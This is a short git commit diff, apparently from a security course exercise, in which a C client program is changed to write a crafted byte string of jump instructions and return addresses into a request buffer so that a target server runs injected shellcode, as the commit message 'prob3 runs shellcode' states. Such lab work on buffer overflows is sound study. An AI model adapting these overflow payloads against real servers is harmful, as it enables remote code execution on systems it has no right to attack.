432ee6d97afec9adbe4e019baffd5cde29c7f032
user <user@ubuntu.(none)>
2015-01-28 03:36:58 -0500

    prob3 runs shellcode

--- p1/keane/client3.c
+++ p1/keane/client3.c
@@ -32,8 +32,8 @@ int main(int argc, char** argv)
 		injectlen++;
 	}
 	//strcpy(&reqstring[805],"\xe0\xaf\x04\x08;");
-	//strcpy(&reqstring[801],"\xeb\x47\x47\xeb\xf9\x99\x04\x08\xf9\x99\x04\x08");
-	strcpy(&reqstring[805],"\xf8\x99\x04\x08");
+	strcpy(&reqstring[796],"\xe9\x1b\xfd\xff\xff\xeb\xf9\xff\xff\xf9\x99\x04\x08\xf9\x99\x04\x08");
+	//strcpy(&reqstring[805],"\xf8\x99\x04\x08");
 
 	int PORTNUM;
 	char SERVER_IP[16];
